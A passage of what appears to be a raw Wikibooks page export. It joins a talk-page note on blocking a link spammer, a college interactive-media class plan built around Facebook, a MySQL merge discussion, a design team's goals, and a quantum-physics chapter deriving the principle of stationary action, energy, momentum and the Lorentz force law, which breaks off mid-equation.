:I've blocked this user. there have been at least 2 other instances of similar linkspamming in less then an hour, and I have reason to suspect that they are all related (sockpuppets, I assume). All similar offenses, as far as i am concerned, should be considered sockpuppets or repeats, and are blockable. --[[User:Whiteknight|Whiteknight]]&lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:30, 28 June 2006 (UTC)</text>

      <comment>Robot: Changing Category:Advanced Interactive Media Class</comment>
      <text xml:space="preserve">'''This Advanced Class is designed to represent the way interactive designers commonly work in their industry. ''' 

1. Three production teams (interactive, audio/video, design) teach each other software with my guidance.  This way they encounter 12 products instead of 4 as in previous years.  20% of their team grade is based on their teaching/presenting success. 

2. The goal for this class is the production of a recruiting team product for the Fall 07 College Weekend.

3. Most media for the project is moved through the internet, usually during non-class hours.

4. Students are writing their own text as a WIKIbook, a technique that has proven potential for exceptional learning.

5. Informal writing moves from Facebook to the &quot;Advanced Interactive Media&quot; WIKIbook where thoughts are formalized in a  text outlined by the teacher.  

6. The majority of project communication takes place via social networking software (Facebook.com) which requires that every student blog daily.  It is relatively simple for teachers to track the quantity and quality of communications over any period of time.

'''Guidelines and rules for the use of Facebook and WIKIbooks as a social networking tool are as follows:'''

1. Every student is required to communicate via Facebook at least four times per week and much more often when team activities require it.

2. The discussion board in Facebook is limited to topics for three teams (Interactive, Audio/Video, Design), the project director, the teacher and each person in the class.  No new &quot;Topics&quot; can be added without permission from the project director or teacher in order to make the long-term tracking of all communications manageable by students and the teacher.  A history of all communications based on these identities is easy to access, review and grade,

3. New chapters cannot be added  to the WIKIbook by students in the class - only the teacher and project manager can do this.  The editing and contribution of all other content including photo uploads, URL links, etc. is expected.

4. Students are responsible to read Facebook messages from their team leader for their individual group, Mr. Eland, Jenny, and wall postings.  

5. Students are expected to target their Facebook blogs towards intended individuals and team leaders.  On rare occasions it will be appropriate to message every class member.

_________________

College students have been conditioned by at least eleven years of conventional instruction.  They normally expect to receive lectures, detailed instructions, tests and then a final grade intended to indicate what they can remember about their learning experience.  Self-instruction, team work and technology-based communication is as great a challenge for students as it is for the instructor, but well worth the effort if they are to be prepared for future job opportunities in the development of interactive media.

      <text xml:space="preserve">==Merge from MySQL/Table types==
G'day, it has been suggested that &lt;s&gt;this module&lt;/s&gt; ''[[MySQL/Table types]]'' be merged into [[MySQL/Optimization]]. I'd recommend keeping it separate, as discussions of optimisation take into account more aspects of database design and configuration than simply the engine type, and conversely, engine type differences account for more than just differences in performance. Additionally, it is useful to show comparative features and pros/cons between different engine types, even for readers not (yet) interested in optimisation.

:What page is suggested to be merged with MySQL/Optimization? (this is MySQL/Optimization here ;)) [[User:Beuc|Beuc]] 21:11, 14 March 2007 (UTC)

::Duh! My bad, I clicked the (discuss) link on the merge tag on [[MySQL/Table types]] and didn't notice that it brought me here. I've changed the section name.
::Someone has tagged /Table types with a {{tl|mergeto}}, but I think it should sit separately. Optimisation takes in selecting engine type, but engine type affects more than performance.

:I agree with Webaware for the reasons he already explained.

      <text xml:space="preserve">== Goals and Description ==

The role of the Design Team in the Multimedia Recruiting Project is one of the most essential and vital roles of all the teams. They are in charge of designing the look and style of all the elements of the project. They are developing design strategies and screen templates for the video and interactive teams as well as shooting VR's. They design the marketing materials and are striving to hit on alternative advertising. They will create innovative and creative electronic and print materials. They will form a focus group of high school students from the Tulsa area in order to understand the target market more in depth.

The team's goal and objective is to make the project appealing to the target market. Our vision is for not only the design be accepted and enjoyed by the target market, but also create a memorable experience that will make an impression on potential students. They understand the position of influence they have with their audience. They see beyond the design into the possibility that they have to help potential students realize a purpose for their life.

[[This quantum world/Feynman route/Free propagator|'''&amp;lt; PREVIOUS''']]
&lt;/div&gt;

==From quantum to classical==
===Action===
Let's go back to the propagator
:&lt;math&gt;
\langle B|A\rangle=\int\!\mathcal{DC}\,Z[\mathcal{C}:A\rightarrow B] .
&lt;/math&gt;
For a free and stable particle we found that
:&lt;math&gt;
Z[\mathcal{C}]=e^{-(i/\hbar)\,m\,c^2\,s[\mathcal{C}]},\qquad s[\mathcal{C}]= \int_\mathcal{C}ds,
&lt;/math&gt;
where &lt;math&gt;ds=\sqrt{dt^2-(dx^2+dy^2+dz^2)/c^2}&lt;/math&gt; is the proper-time interval associated with the path element &lt;math&gt;d\mathcal{C}&lt;/math&gt;. For the general case we found that the amplitude &lt;math&gt;Z(d\mathcal{C})&lt;/math&gt; is a function of &lt;math&gt;t,x,y,z&lt;/math&gt; and &lt;math&gt;dt,dx,dy,dz&lt;/math&gt; or, equivalently, of the coordinates &lt;math&gt;t,x,y,z&lt;/math&gt;, the components &lt;math&gt;c\,dt/ds, dx/ds, dy/ds, dz/ds&lt;/math&gt; of the 4-velocity, as well as&amp;nbsp;&lt;math&gt;ds&lt;/math&gt;. For a particle that is stable but not free, we obtain, by the same argument that led to the above amplitude,
:&lt;math&gt;
Z[\mathcal{C}]=e^{(i/\hbar)\,S[\mathcal{C}]},
&lt;/math&gt;
where we have introduced the functional &lt;math&gt;S[\mathcal{C}]=\int_\mathcal{C}dS&lt;/math&gt;, which goes by the name ''action''.

For a free and stable particle, &lt;math&gt;S[\mathcal{C}]&lt;/math&gt; is the proper time (or proper duration) &lt;math&gt;s[\mathcal{C}]=\int_\mathcal{C}ds&lt;/math&gt; multiplied by &lt;math&gt;-mc^2&lt;/math&gt;, and the infinitesimal action &lt;math&gt;dS[d\mathcal{C}]&lt;/math&gt; is proportional to&amp;nbsp;&lt;math&gt;ds&lt;/math&gt;:
:&lt;math&gt;
S[\mathcal{C}]=-m\,c^2\,s[\mathcal{C}],\qquad dS[d\mathcal{C}]=-m\,c^2\,ds.
&lt;/math&gt;

&lt;br&gt;Let's recap. We know all about the motion of a stable particle if we know how to calculate the probability&amp;nbsp;&lt;math&gt;p(B|A)&lt;/math&gt; (in all circumstances). We know this if we know the amplitude&amp;nbsp;&lt;math&gt;\langle B|A\rangle&lt;/math&gt;. We know the latter if we know the functional&amp;nbsp;&lt;math&gt;Z[\mathcal{C}]&lt;/math&gt;. And we know this functional if we know the infinitesimal action &lt;math&gt;dS(t,x,y,z,dt,dx,dy,dz)&lt;/math&gt; or &lt;math&gt;dS(t,\mathbf{r},dt,d\mathbf{r})&lt;/math&gt; (in all circumstances).

What do we know about &lt;math&gt;dS&lt;/math&gt;?

The multiplicativity of successive propagators implies the additivity of actions associated with neighboring infinitesimal path segments &lt;math&gt;d\mathcal{C}_1&lt;/math&gt; and &lt;math&gt;d\mathcal{C}_2&lt;/math&gt;. In other words,
:&lt;math&gt;
e^{(i/\hbar)\,dS(d\mathcal{C}_1+d\mathcal{C}_2)}= e^{(i/\hbar)\,dS(d\mathcal{C}_2)}\, e^{(i/\hbar)\,dS(d\mathcal{C}_1)}
&lt;/math&gt;
implies
:&lt;math&gt;
dS(d\mathcal{C}_1+d\mathcal{C}_2)= dS(d\mathcal{C}_1)+ dS(d\mathcal{C}_2).
&lt;/math&gt;
It follows that the differential &lt;math&gt;dS&lt;/math&gt; is homogeneous (of degree&amp;nbsp;1) in the differentials &lt;math&gt;dt,d\mathbf{r}&lt;/math&gt;:
:&lt;math&gt;
dS(t,\mathbf{r},\lambda\,dt,\lambda\,d\mathbf{r})=\lambda\,dS(t,\mathbf{r},dt,d\mathbf{r}).
&lt;/math&gt;
This property of &lt;math&gt;dS&lt;/math&gt; makes it possible to think of the action &lt;math&gt;S[\mathcal{C}]&lt;/math&gt; as a (particle-specific) length associated with&amp;nbsp;&lt;math&gt;\mathcal{C}&lt;/math&gt;, and of&amp;nbsp;&lt;math&gt;dS&lt;/math&gt; as defining a (particle-specific) spacetime geometry. By substituting &lt;math&gt;1/dt&lt;/math&gt; for &lt;math&gt;\lambda&lt;/math&gt; we get:
:&lt;math&gt;
dS(t,\mathbf{r},\mathbf{v})=\frac{dS}{dt}.
&lt;/math&gt;
Something is wrong, isn't it? Since the right-hand side is now a finite quantity, we shouldn't use the symbol &lt;math&gt;dS&lt;/math&gt; for the left-hand side. What we have actually found is that there is a function &lt;math&gt;L(t,\mathbf{r},\mathbf{v})&lt;/math&gt;, which goes by the name ''Lagrange function'', such that &lt;math&gt;dS=L\,dt&lt;/math&gt;.

&lt;br&gt;

===Geodesic equations===
Consider a spacetime path &lt;math&gt;\mathcal{C}&lt;/math&gt; from &lt;math&gt;A&lt;/math&gt; to &lt;math&gt;B.&lt;/math&gt; Let's change (&quot;vary&quot;) it in such a way that every point&amp;nbsp;&lt;math&gt;(t,\mathbf{r})&lt;/math&gt; of &lt;math&gt;\mathcal{C}&lt;/math&gt; gets shifted by an infinitesimal amount to a corresponding point &lt;math&gt;(t+\delta t,\mathbf{r}+\delta\mathbf{r}),&lt;/math&gt; except the end points, which are held fixed: &lt;math&gt;\delta t=0&lt;/math&gt; and &lt;math&gt;\delta\mathbf{r}=0&lt;/math&gt; at both &lt;math&gt;A&lt;/math&gt; and&amp;nbsp;&lt;math&gt;B.&lt;/math&gt;

If &lt;math&gt;t\rightarrow t+\delta t,&lt;/math&gt; then &lt;math&gt;dt=t_2-t_1\longrightarrow t_2+\delta t_2-(t_1+\delta t_1)= (t_2-t_1)+(\delta t_2-\delta t_1)=dt+d\delta t.&lt;/math&gt;

By the same token, &lt;math&gt;d\mathbf{r}\rightarrow d\mathbf{r} + d\delta\mathbf{r}.&lt;/math&gt;

In general, the change &lt;math&gt;\mathcal{C}\rightarrow\mathcal{C}'&lt;/math&gt; will cause a corresponding change in the action: &lt;math&gt;S[\mathcal{C}]\rightarrow S[\mathcal{C}']\neq S[\mathcal{C}].&lt;/math&gt; If the action does not change (that is, if it is ''stationary'' at&amp;nbsp;&lt;math&gt;\mathcal{C}&lt;/math&gt;&amp;nbsp;), 
:&lt;math&gt;
\delta S=\int_{\mathcal{C}'} dS-\int_\mathcal{C} dS=0,
&lt;/math&gt;
then &lt;math&gt;\mathcal{C}&lt;/math&gt; is a ''geodesic'' of the geometry defined by&amp;nbsp;&lt;math&gt;dS.&lt;/math&gt; (A function &lt;math&gt;f(x)&lt;/math&gt; is stationary at those values of &lt;math&gt;x&lt;/math&gt; at which its value does not change if &lt;math&gt;x&lt;/math&gt; changes infinitesimally. By the same token we call a functional &lt;math&gt;S[\mathcal{C}]&lt;/math&gt; stationary if its value does not change if &lt;math&gt;\mathcal{C}&lt;/math&gt; changes infinitesimally.)

To obtain a handier way to characterize geodesics, we begin by expanding

&lt;br&gt;
:&lt;math&gt;
dS(\mathcal{C}')=dS(t+\delta t,\mathbf{r}+\delta\mathbf{r},dt+d\delta t,d\mathbf{r}+d\delta\mathbf{r})
&lt;/math&gt;
:&lt;math&gt;
=dS(t,\mathbf{r},dt,d\mathbf{r})+\frac{\partial dS}{\partial t}\,\delta t+\frac{\partial dS}{\partial\mathbf{r}}\cdot\delta\mathbf{r}+
\frac{\partial dS}{\partial dt}\,d\delta t+\frac{\partial dS}{\partial d\mathbf{r}}\cdot d\delta\mathbf{r}.
&lt;/math&gt;

&lt;br&gt;This gives us

&lt;br&gt;
:&lt;math&gt;
(^*)\quad\int_{\mathcal{C}'} dS-\int_\mathcal{C} dS=\int_\mathcal{C}\left[{\partial dS\over\partial t}\delta t+
{\partial dS\over\partial\mathbf{r}}\cdot\delta\mathbf{r}+{\partial dS\over\partial dt}d\,\delta t+
{\partial dS\over\partial d\mathbf{r}}\cdot d\,\delta\mathbf{r}\right].
&lt;/math&gt;

&lt;br&gt;Next we use the product rule for derivatives,

&lt;br&gt;
:&lt;math&gt;
d\left({\partial dS\over\partial dt}\delta t\right)=
\left(d{\partial dS\over\partial dt}\right)\delta t+{\partial dS\over\partial dt}d\,\delta t,
&lt;/math&gt;
:&lt;math&gt;
d\left({\partial dS\over\partial d\mathbf{r}}\cdot\delta\mathbf{r}\right)=
\left(d{\partial dS\over\partial d\mathbf{r}}\right)\cdot\delta\mathbf{r}+
{\partial dS\over\partial d\mathbf{r}}\cdot d\,\delta\mathbf{r},
&lt;/math&gt;

&lt;br&gt;to replace the last two terms of (*), which takes us to

&lt;br&gt;
:&lt;math&gt;
\delta S=\int\left[\left({\partial dS\over\partial t}-d{\partial dS\over\partial dt}\right)\delta t+\left({\partial dS\over\partial\mathbf{r}}-d{\partial dS\over\partial d\mathbf{r}}\right)\cdot\delta\mathbf{r}\right]+\int d\left({\partial dS\over\partial dt}\delta t+{\partial dS\over\partial d\mathbf{r}}\cdot \delta\mathbf{r}\right).
&lt;/math&gt;

&lt;br&gt;The second integral vanishes because it is equal to the difference between the values of the expression in brackets at the end points &lt;math&gt;A&lt;/math&gt; and&amp;nbsp;&lt;math&gt;B,&lt;/math&gt; where &lt;math&gt;\delta t=0&lt;/math&gt; and &lt;math&gt;\delta\mathbf{r}=0.&lt;/math&gt; If &lt;math&gt;\mathcal{C}&lt;/math&gt; is a geodesic, then the first integral vanishes, too. In fact, in this case &lt;math&gt;\delta S=0&lt;/math&gt; must hold for all possible (infinitesimal) variations &lt;math&gt;\delta t&lt;/math&gt; and&amp;nbsp;&lt;math&gt;\delta\mathbf{r},&lt;/math&gt; whence it follows that the ''integrand'' of the first integral vanishes. The bottom line is that the geodesics defined by &lt;math&gt;dS&lt;/math&gt; satisfy the ''geodesic equations''

&lt;br&gt;
{| style=&quot;border:5px solid lightsteelblue&quot; cellpadding=&quot;20px&quot;
|&lt;math&gt;
{\partial dS\over\partial t}=d\,{\partial dS\over\partial dt},\qquad
{\partial dS\over\partial\mathbf{r}}=d\,{\partial dS\over\partial d\mathbf{r}}.
&lt;/math&gt;

&lt;br&gt;

===Principle of least action===
If an object travels from &lt;math&gt;A&lt;/math&gt; to &lt;math&gt;B,&lt;/math&gt; it travels along all paths from &lt;math&gt;A&lt;/math&gt; to &lt;math&gt;B,&lt;/math&gt; in the same sense in which an electron goes through both slits. Then how is it that a big thing (such as a planet, a tennis ball, or a mosquito) appears to move along a single well-defined path?

There are at least two reasons. One of them is that the bigger an object is, the harder it is to satisfy the conditions stipulated by Rule&amp;nbsp;&lt;math&gt;B.&lt;/math&gt; Another reason is that even if these conditions are satisfied, the likelihood of finding an object of mass&amp;nbsp;&lt;math&gt;m&lt;/math&gt; where according to the laws of classical physics it should not be, decreases as &lt;math&gt;m&lt;/math&gt; increases.

To see this, we need to take account of the fact that it is strictly impossible to check whether an object that has travelled from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;B,&lt;/math&gt; has done so along a mathematically precise path&amp;nbsp;&lt;math&gt;\mathcal{C}.&lt;/math&gt; Let us make the half realistic assumption that what we ''can'' check is whether an object has travelled from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;B&lt;/math&gt; within a a narrow bundle of paths — the paths contained in a narrow tube&amp;nbsp;&lt;math&gt;\mathcal{T}.&lt;/math&gt; The probability of finding that it has, is the absolute square of the path integral &lt;math&gt;I(\mathcal{T})=\int_\mathcal{T}\mathcal{DC} e^{(i/\hbar)S[\mathcal{C}]},&lt;/math&gt; which sums over the paths contained in&amp;nbsp;&lt;math&gt;\mathcal{T}.&lt;/math&gt;

Let us assume that there is exactly one path from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;B&lt;/math&gt; for which &lt;math&gt;S[\mathcal{C}]&lt;/math&gt; is stationary: its length does not change if we vary the path ever so slightly, no matter how. In other words, we assume that there is exactly one geodesic. Let's call it&amp;nbsp;&lt;math&gt;\mathcal{G},&lt;/math&gt; and let's assume it lies in&amp;nbsp;&lt;math&gt;\mathcal{T}.&lt;/math&gt;

No matter how rapidly the phase &lt;math&gt;S[\mathcal{C}]/\hbar&lt;/math&gt; changes under variation of a generic path&amp;nbsp;&lt;math&gt;\mathcal{C},&lt;/math&gt; it will be stationary at&amp;nbsp;&lt;math&gt;\mathcal{G}.&lt;/math&gt; This means, loosly speaking, that a large number of paths near&amp;nbsp;&lt;math&gt;\mathcal{G}&lt;/math&gt; contribute to &lt;math&gt;I(\mathcal{T})&lt;/math&gt; with almost equal phases. As a consequence, the magnitude of the sum of the corresponding phase factors &lt;math&gt;e^{(i/\hbar)S[\mathcal{C}]}&lt;/math&gt; is large.

If &lt;math&gt;S[\mathcal{C}]/\hbar&lt;/math&gt; is not stationary at&amp;nbsp;&lt;math&gt;\mathcal{C},&lt;/math&gt; all depends on how rapidly it changes under variation of&amp;nbsp;&lt;math&gt;\mathcal{C}.&lt;/math&gt; If it changes sufficiently rapidly, the phases associated with paths near &lt;math&gt;\mathcal{C}&lt;/math&gt; are more or less equally distributed over the interval &lt;math&gt;[0,2\pi],&lt;/math&gt; so that the corresponding phase factors add up to a complex number of comparatively small magnitude. In the limit &lt;math&gt;S[\mathcal{C}]/\hbar\rightarrow\infty,&lt;/math&gt; the only significant contributions to &lt;math&gt;I(\mathcal{T})&lt;/math&gt; come from paths in the infinitesimal neighborhood of&amp;nbsp;&lt;math&gt;\mathcal{G}.&lt;/math&gt; 

We have assumed that &lt;math&gt;\mathcal{G}&lt;/math&gt; lies in&amp;nbsp;&lt;math&gt;\mathcal{T}.&lt;/math&gt; If it does not, and if &lt;math&gt;S[\mathcal{C}]/\hbar&lt;/math&gt; changes sufficiently rapidly, the phases associated with paths near ''any'' path in &lt;math&gt;\mathcal{T}&lt;/math&gt; are more or less equally distributed over the interval &lt;math&gt;[0,2\pi],&lt;/math&gt; so that in the limit &lt;math&gt;S[\mathcal{C}]/\hbar\rightarrow\infty&lt;/math&gt; there are no significant contributions to&amp;nbsp;&lt;math&gt;I(\mathcal{T}).&lt;/math&gt;

For a free particle, as you will remember, &lt;math&gt;S[\mathcal{C}]=-m\,c^2\,s[\mathcal{C}].&lt;/math&gt; From this we gather that the likelihood of finding a freely moving object where according to the laws of classical physics it should not be, decreases as its mass increases. Since for sufficiently massive objects the contributions to the action due to influences on their motion are small compared to &lt;math&gt;|-m\,c^2\,s[\mathcal{C}]|,&lt;/math&gt; this is equally true of objects that are not moving freely.

What, then, ''are'' the laws of classical physics?

They are what the laws of quantum physics degenerate into in the limit &lt;math&gt;\hbar\rightarrow0.&lt;/math&gt; In this limit, as you will gather from the above, the probability of finding that a particle has traveled within a tube (however narrow) containing a geodesic, is&amp;nbsp;1, and the probability of finding that a particle has traveled within a tube (however wide) not containing a geodesic, is&amp;nbsp;0. Thus we may state the laws of classical physics (for a single &quot;point mass&quot;, to begin with) by saying that it follows a geodesic of the geometry defined by&amp;nbsp;&lt;math&gt;dS.&lt;/math&gt;

This is readily generalized. The propagator for a system with &lt;math&gt;n&lt;/math&gt; degrees of freedom — such as an &lt;math&gt;m&lt;/math&gt;-particle system with &lt;math&gt;n=3m&lt;/math&gt; degrees of freedom — is
:&lt;math&gt;
\langle \mathcal{P}_f,t_f|\mathcal{P}_i,t_i\rangle=\int\!\mathcal{DC}\,e^{(i/\hbar)S[\mathcal{C}]},
&lt;/math&gt;
where &lt;math&gt;\mathcal{P}_i&lt;/math&gt; and &lt;math&gt;\mathcal{P}_f&lt;/math&gt; are the system's respective configurations at the initial time&amp;nbsp;&lt;math&gt;t_i&lt;/math&gt; and the final time&amp;nbsp;&lt;math&gt;t_f,&lt;/math&gt; and the integral sums over all paths in the system's &lt;math&gt;n{+}1&lt;/math&gt;-dimensional configuration spacetime leading from &lt;math&gt;(\mathcal{P}_i,t_i)&lt;/math&gt; to&amp;nbsp;&lt;math&gt;(\mathcal{P}_f,t_f).&lt;/math&gt; In this case, too, the corresponding classical system follows a geodesic of the geometry defined by the action differential&amp;nbsp;&lt;math&gt;dS,&lt;/math&gt; which now depends on &lt;math&gt;n&lt;/math&gt; spatial coordinates, one time coordinate, and the corresponding &lt;math&gt;n{+}1&lt;/math&gt; differentials.

The statement that a classical system follows a geodesic of the geometry defined by its action, is often referred to as the ''principle of least action''. A more appropriate name is ''principle of stationary action''.

&lt;br&gt;

===Energy and momentum===
Observe that if &lt;math&gt;dS&lt;/math&gt; does not depend on &lt;math&gt;t&lt;/math&gt; (that is, &lt;math&gt;\partial dS/\partial t=0&lt;/math&gt;&amp;nbsp;) then
:&lt;math&gt;
E=-{\partial dS\over\partial dt}
&lt;/math&gt;
is constant along geodesics.  (We'll discover the reason for the negative sign in a moment.)

Likewise, if &lt;math&gt;dS&lt;/math&gt; does not depend on&amp;nbsp;&lt;math&gt;\mathbf{r}&lt;/math&gt; (that is, &lt;math&gt;\partial dS/\partial\mathbf{r}=0&lt;/math&gt;&amp;nbsp;) then
:&lt;math&gt;
\mathbf{p}={\partial dS\over\partial d\mathbf{r}}
&lt;/math&gt;
is constant along geodesics.

&lt;math&gt;E&lt;/math&gt;&amp;nbsp;tells us how much the projection&amp;nbsp;&lt;math&gt;dt&lt;/math&gt; of a segment&amp;nbsp;&lt;math&gt;d\mathcal{C}&lt;/math&gt; of a path&amp;nbsp;&lt;math&gt;\mathcal{C}&lt;/math&gt; onto the time axis contributes to the action of&amp;nbsp;&lt;math&gt;\mathcal{C}.&lt;/math&gt; &lt;math&gt;\mathbf{p}&lt;/math&gt;&amp;nbsp;tells us how much the projection&amp;nbsp;&lt;math&gt;d\mathbf{r}&lt;/math&gt; of&amp;nbsp;&lt;math&gt;d\mathcal{C}&lt;/math&gt; onto space contributes to&amp;nbsp;&lt;math&gt;S[\mathcal{C}].&lt;/math&gt; If &lt;math&gt;dS&lt;/math&gt; has no explicit time dependence, then equal intervals of the time axis make equal contributions to&amp;nbsp;&lt;math&gt;S[\mathcal{C}],&lt;/math&gt; and if &lt;math&gt;dS&lt;/math&gt; has no explicit space dependence, then equal intervals of any spatial axis make equal contributions to&amp;nbsp;&lt;math&gt;S[\mathcal{C}].&lt;/math&gt; In the former case, equal time intervals are ''physically equivalent'': they represent ''equal durations''. In the latter case, equal space intervals are ''physically equivalent'': they represent ''equal distances''.

If equal intervals of the time coordinate or equal intervals of a space coordinate are ''not'' physically equivalent, this is so for either of two reasons. The first is that non-inertial coordinates are used. For if inertial coordinates are used, then ''every'' freely moving point mass moves by equal intervals of the space coordinates in equal intervals of the time coordinate, which means that equal coordinate intervals ''are'' physically equivalent. The second is that whatever it is that is moving is not moving ''freely'': something, no matter what, influences its motion, no matter how. This is because one way of incorporating effects on the motion of an object into the mathematical formalism of quantum physics, is to make inertial coordinate intervals physically ''inequivalent'', by letting &lt;math&gt;dS&lt;/math&gt; depend on&amp;nbsp;&lt;math&gt;t&lt;/math&gt; and/or&amp;nbsp;&lt;math&gt;\mathbf{r}.&lt;/math&gt;

Thus for a freely moving classical object, both &lt;math&gt;E&lt;/math&gt; and &lt;math&gt;\mathbf{p}&lt;/math&gt; are constant. Since the constancy of&amp;nbsp;&lt;math&gt;E&lt;/math&gt; follows from the physical equivalence of equal intervals of coordinate time (a.k.a. the &quot;homogeneity&quot; of time), and since (classically) energy is defined as the quantity whose constancy is implied by the homogeneity of time, &lt;math&gt;E&lt;/math&gt; is the object's ''energy''.

By the same token, since the constancy of&amp;nbsp;&lt;math&gt;\mathbf{p}&lt;/math&gt; follows from the physical equivalence of equal intervals of any spatial coordinate axis (a.k.a. the &quot;homogeneity&quot; of space), and since (classically) momentum is defined as the quantity whose constancy is implied by the homogeneity of space, &lt;math&gt;\mathbf{p}&lt;/math&gt; is the object's ''momentum''.

Let us differentiate [http://en.wikibooks.org/wiki/This_quantum_world/Feynman_route/From_quantum_to_classical#Action a former result],
:&lt;math&gt;
dS(t,\mathbf{r},\lambda\,dt,\lambda\,d\mathbf{r})=\lambda\,dS(t,\mathbf{r},dt,d\mathbf{r}),
&lt;/math&gt;
with respect to &lt;math&gt;\lambda.&lt;/math&gt; The left-hand side becomes
:&lt;math&gt;
{d(dS)\over d\lambda}={\partial dS\over\partial(\lambda dt)}{\partial(\lambda dt)\over\partial\lambda}+
{\partial dS\over\partial(\lambda d\mathbf{r})}\cdot{\partial(\lambda d\mathbf{r})\over\partial\lambda}=
{\partial dS\over\partial(\lambda dt)}dt+{\partial dS\over\partial(\lambda d\mathbf{r})}\cdot d\mathbf{r},
&lt;/math&gt;
while the right-hand side becomes just &lt;math&gt;dS.&lt;/math&gt; Setting &lt;math&gt;\lambda=1&lt;/math&gt; and using the above definitions of &lt;math&gt;E&lt;/math&gt; and &lt;math&gt;\mathbf{p},&lt;/math&gt; we obtain

{| style=&quot;border:5px solid lightsteelblue&quot; cellpadding=&quot;20px&quot;
|&lt;math&gt;
-E\,dt+\mathbf{p}\cdot d\mathbf{r}=dS.
&lt;/math&gt;
|}

&lt;math&gt;dS=-m\,c^2\,ds&lt;/math&gt; is a 4-scalar. Since &lt;math&gt;(c\,dt,d\mathbf{r})&lt;/math&gt; are the components of a 4-vector, the left-hand side, &lt;math&gt;-E\,dt+\mathbf{p}\cdot d\mathbf{r},&lt;/math&gt; is a 4-scalar if and only if &lt;math&gt;(E/c,\mathbf{p})&lt;/math&gt; are the components of another 4-vector.

(If we had defined &lt;math&gt;E&lt;/math&gt; without the minus, this 4-vector would have the components &lt;math&gt;(-E/c,\mathbf{p}).&lt;/math&gt;)

In the rest frame &lt;math&gt;\mathcal{F}'&lt;/math&gt; of a free point mass, &lt;math&gt;dt'=ds&lt;/math&gt; and &lt;math&gt;dS=-m\,c^2\,dt'.&lt;/math&gt; Using the [http://en.wikibooks.org/wiki/This_quantum_world/Appendix/Relativity/Lorentz#The_actual_Lorentz_transformations Lorentz transformations], we find that this equals
:&lt;math&gt;
dS=-mc^2{dt-v\,dx/c^2\over\sqrt{1-v^2/c^2}}=-{mc^2\over\sqrt{1-v^2/c^2}}\,dt+ {m\mathbf{v}\over\sqrt{1-v^2/c^2}}\cdot d\mathbf{r},
&lt;/math&gt;
where &lt;math&gt;\mathbf{v}=(v,0,0)&lt;/math&gt; is the velocity of the point mass in&amp;nbsp;&lt;math&gt;\mathcal{F}.&lt;/math&gt; Compare with the above framed equation to find that for a free point mass,
:&lt;math&gt;
E={mc^2\over\sqrt{1-v^2/c^2}}\qquad\mathbf{p}={m\mathbf{v}\over\sqrt{1-v^2/c^2}}\;.
&lt;/math&gt;

&lt;br&gt;

===Lorentz force law===
To incorporate effects on the motion of a particle (regardless of their causes), we must modify the action differential &lt;math&gt;dS=-mc^2\,dt\sqrt{1-v^2/c^2}&lt;/math&gt; that a free particle associates with a path segment&amp;nbsp;&lt;math&gt;d\mathcal{C}.&lt;/math&gt; In doing so we must take care that the modified &lt;math&gt;dS&lt;/math&gt; (i)&amp;nbsp;remains [http://en.wikibooks.org/wiki/This_quantum_world/Feynman_route/From_quantum_to_classical#Action homogeneous in the differentials] and (ii)&amp;nbsp;remains a 4-scalar. The most straightforward way to do this is to add a term that is not just homogeneous but linear in the coordinate differentials:
:&lt;math&gt;
(^*)\quad dS=-mc^2\,dt\sqrt{1-v^2/c^2}-qV(t,\mathbf{r})\,dt+ (q/c)\mathbf{A}(t,\mathbf{r})\cdot d\mathbf{r}.
&lt;/math&gt;
Believe it or not, all classical electromagnetic effects (as against their causes) are accounted for by this expression. &lt;math&gt;V(t,\mathbf{r})&lt;/math&gt; is a scalar field (that is, a function of time and space coordinates that is invariant under rotations of the space coordinates), &lt;math&gt;\mathbf{A}(t,\mathbf{r})&lt;/math&gt; is a 3-vector field, and &lt;math&gt;(V,\mathbf{A})&lt;/math&gt; is a 4-vector field. We call &lt;math&gt;V&lt;/math&gt; and &lt;math&gt;\mathbf{A}&lt;/math&gt; the ''scalar potential'' and the ''vector potential'', respectively. The particle-specific constant&amp;nbsp;&lt;math&gt;q&lt;/math&gt; is the electric charge, which determines how strongly a particle of a given species is affected by influences of the electromagnetic kind.

If a point mass is not free, the expressions at the end of the [[This quantum world/Feynman route/From_quantum_to_classical#Energy and momentum|previous section]] give its ''kinetic energy'' &lt;math&gt;E_k&lt;/math&gt; and its ''kinetic momentum'' &lt;math&gt;\mathbf{p}_k.&lt;/math&gt; Casting (*) into the form
:&lt;math&gt;
dS=-(E_k+qV)\,dt+[\mathbf{p}_k+(q/c)\mathbf{A}]\cdot d\mathbf{r}
&lt;/math&gt;
and plugging it into [[This quantum world/Feynman route/From_quantum_to_classical#Energy and momentum|the definitions]]
:&lt;math&gt;
(^*{}^*)\quad E=-{\partial dS\over\partial dt},\qquad \mathbf{p}={\partial dS\over\partial d\mathbf{r}},
&lt;/math&gt;
we obtain
:&lt;math&gt;
E=E_k+qV,\qquad \mathbf{p}=\mathbf{p}_k+(q/c)\mathbf{A}.
&lt;/math&gt;
&lt;math&gt;qV&lt;/math&gt; and &lt;math&gt;(q/c)\mathbf{A}&lt;/math&gt; are the particle's ''potential energy'' and ''potential momentum'', respectively.

Now we plug (**) into the geodesic equation
:&lt;math&gt;
{\partial dS\over\partial\mathbf{r}}=d\,{\partial dS\over\partial d\mathbf{r}}.
&lt;/math&gt;
For the right-hand side we obtain
:&lt;math&gt;
d\mathbf{p}_k+{q\over c}d\mathbf{A}=d\mathbf{p}_k+{q\over c}\left[dt{\partial\mathbf{A}\over\partial t}+\left(d\mathbf{r}\cdot{\partial\over\partial\mathbf{r}}\right)\mathbf{A}\right],
&lt;/math&gt;
while the left-hand side works out at
:&lt;math&gt;
-q{\partial V\over\partial\mathbf{r}}dt+{q\over c}{\partial(\mathbf{A}\cdot d\mathbf{r})\over\partial\mathbf{r}}=
-q{\partial V\over\partial\mathbf{r}}dt+{q\over c}\left[\left(d\mathbf{r}\cdot{\partial\over\partial\mathbf{r}}\right)\mathbf{A}+
d\mathbf{r}\times\left({\partial\over\partial\mathbf{r}}\times\mathbf{A}\right)\right].
&lt;/math&gt;
Two terms cancel out, and the final result is
:&lt;math&gt;
d\mathbf{p}_k=q\underbrace{\left(-{\partial V\over\partial\mathbf{r}}-{1\over c}{\partial\mathbf{A}\over\partial t}\right)}_{\displaystyle\equiv\mathbf{E}}dt+
